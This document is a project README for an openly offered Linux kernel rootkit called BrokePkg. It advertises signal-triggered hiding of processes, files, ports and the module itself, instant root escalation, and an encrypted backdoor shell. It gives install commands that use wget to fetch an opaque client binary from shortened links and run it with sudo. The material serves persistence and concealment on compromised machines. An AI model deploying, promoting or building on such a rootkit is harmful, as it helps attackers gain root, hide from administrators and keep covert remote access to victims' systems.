# BrokePkg

<p align="center">
  <img src="https://i.ibb.co/2tCgDcQ/broke-without.png" width="40%">
</p>

---

Brokepkg is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64, with suport after kernel 5.7, without `kallsyms_lookup_name`.

## Tested on

- **Arch linux**: 5.13.12-arch1-1
- **Kali linux**: 5.10.0-kali3-amd64
- **Linux mint**: 4.19.0-8-amd64
- **Debian 9(stretch)**: 4.9.0-15-amd64
- **Ubuntu 16.04.6 LTS**: 4.4.0-142-generic

## Features

- Hide/unhide any process by sending a signal 63;

<p align="center">
<img src="https://i.ibb.co/Qk618j7/hide-process.png">
</p align="center">

- Sending a signal 31(to any pid) makes the module become (in)visible;

<p align="center">
<img src="https://i.ibb.co/K6vX20R/module-hidden.png">
</p align="center">

- Sending a signal 64(to any pid) makes the given user become root;

<p align="center">
<img src="https://i.ibb.co/Fb68jQ0/root.png">
</p align="center">

- Files or directories starting with the PREFIX become invisible;

<p align="center">
<img src="https://i.ibb.co/N6f5WVL/file-dir-hidden.png">
</p align="center">

- Sending a signal 62 to some port you make he invisible;

<p align="center">
<img src="https://www.imagemhost.com.br/images/2021/03/26/port_example.png">
</p align="center">

- Full TTY/PTY shell and traffic encrypted with openssl

<p align="center">
<img src="https://www.imagemhost.com.br/images/2021/04/07/backdoor.png">
</p align="center">

## Install

### To install lkm, see [wiki page](https://github.com/R3tr074/brokepkg/wiki/install)

### To install client run this:

```bash
# client
sudo apt install socat
brokecli="https://git.io/JYAVw" # to 64 bits
brokecli="https://git.io/JYAVK" # to 32 bits
wget -q $brokecli -O brokecli
chmod +x brokecli
sudo ./brokecli
```

To view mini tutorial use go to [releases](https://github.com/R3tr074/brokepkg/releases/tag/0.8)

## Uninstall

Remove brokepkg invisibility to uninstall him

```bash
kill -31 0
```

Then remove the module

```bash
sudo rmmod brokepkg
```

## References

- LKM HACKING:
  - http://www.ouah.org/LKM_HACKING.html
- Diamorphine:
  - https://github.com/m0nad/Diamorphine
- TheXcellerator:
  - https://xcellerator.github.io/posts/linux_rootkits_11/
  - https://github.com/xcellerator/linux_kernel_hacking
- Conviso:
  - https://blog.convisoappsec.com/linux-rootkits-hooking-syscalls/
- HardDisk:
  - https://harddisk.com.br/p/pt-br-rootkits-explicados/
- Reptile:
  - https://github.com/f0rb1dd3n/Reptile
